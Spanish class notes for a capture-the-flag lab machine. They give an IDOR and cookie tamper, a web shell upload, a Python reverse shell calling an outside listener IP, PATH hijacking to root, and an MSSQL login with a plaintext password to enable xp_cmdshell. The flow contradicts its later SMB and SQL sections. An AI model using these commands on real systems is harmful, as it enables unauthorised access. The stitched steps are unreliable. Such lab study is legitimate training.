## ① Archetype — Repaso completo

### Flujo de la máquina

1. **Nmap** → Puertos 22 (SSH), 80 (HTTP)
2. **Web** → Página con formulario de búsqueda
3. **IDOR** → Cambiar `id=2` por `id=1` → Obtener datos de admin
4. **Cookie manipulation** → Cambiar role de `guest` a `admin`
5. **Upload** → Subir web shell
6. **Reverse shell** → Conexión por netcat
7. **Shell interactiva** → Python + stty + export
8. **Escalada** → PATH manipulation con binario malicioso

## ② IDOR en Archetype

```
GET /index.php?id=2  → Datos de guest
GET /index.php?id=1  → Datos de admin (¡IDOR!)
```

**Cookie modification:**
```
Cookie: role=guest; user_id=2
→ Cambiar a: role=admin; user_id=1
```

> [!important] OWASP Top 10 — IDOR
> IDOR (Insecure Direct Object Reference) es cuando puedes acceder a datos de otro usuario simplemente cambiando un ID en la URL o un parámetro en la cookie.

## ③ Upload de web shell

### Configurar directorio de uploads

```bash
feroxbuster -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Encontrar directorio `/GoogleApp/` o similar.

### Subir archivo PHP

Subir un archivo `.php` con código de reverse shell.

> [!important] No todos los uploads son ejecutables
> A veces el servidor muestra el código PHP en vez de ejecutarlo. Si ves el código en vez de la página, el servidor no está interpretando PHP.

## ④ Reverse shell y estabilización

```bash
# Listener
nc -lvnp 4444

# En el servidor
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.10.14.185',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
```

**Estabilización:**
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## ⑤ Escalada de privilegios — PATH manipulation

### Identificar binario con permisos especiales

```bash
find / -perm -4000 2>/dev/null
# o
ls -la /usr/bin/boottracker
```

### Ver qué hace el binario

```bash
strings /usr/bin/boottracker
```

**Resultado:** Ejecuta `cat /root/reports/...`

### Crear binario malicioso en /tmp

```bash
echo '#!/bin/bash
/bin/bash' > /tmp/cat
chmod +x /tmp/cat
```

### Modificar PATH

```bash
export PATH=/tmp:$PATH
```

### Ejecutar el binario

```bash
/usr/bin/boottracker
```

**Resultado:** Shell como root.

> [!important] PATH manipulation
> Linux busca binarios en el PATH. Si modificas el PATH para que primero busque en `/tmp`, y ahí hay un `cat` malicioso, cuando el binario ejecute `cat` ejecutará tu versión.

## ⑥ SMB — Server Message Block

### Enumeración con smbclient

```bash
smbclient -N //IP/Backups
smb: \> ls
smb: \> get configuration.txt
```

### Encontrar credenciales

## ⑦ SQL Server con Impacket

### Conexión

```bash
mssqlclient.py 'sql_svc:GWE3V65#6KFH93@4GWTG2G@IP'
```

### Verificar permisos

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Devuelve 1 = eres admin
```

### Activar XP_CMDShell

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Ejecutar comandos

```sql
EXEC xp_cmdshell 'whoami';
```

## ⑨ Notas de clase

- **IDOR**: Cambiar IDs o cookies para acceder a datos de otros usuarios.
- **PATH manipulation**: Cambiar el PATH para que se ejecute un binario malicioso.
- **SMB**: Siempre enumerar comparticiones anónimas.
- **SQL Server**: Impacket + XP_CMDShell = ejecución de comandos.
- **LinPEAS/WinPEAS**: Automatizan la búsqueda de vectores de escalada.
- **HGHTricks**: Enciclopedia de comandos para cada servicio.
- **Reutilización de contraseñas**: Siempre probar todas las contraseñas encontradas con todos los usuarios.
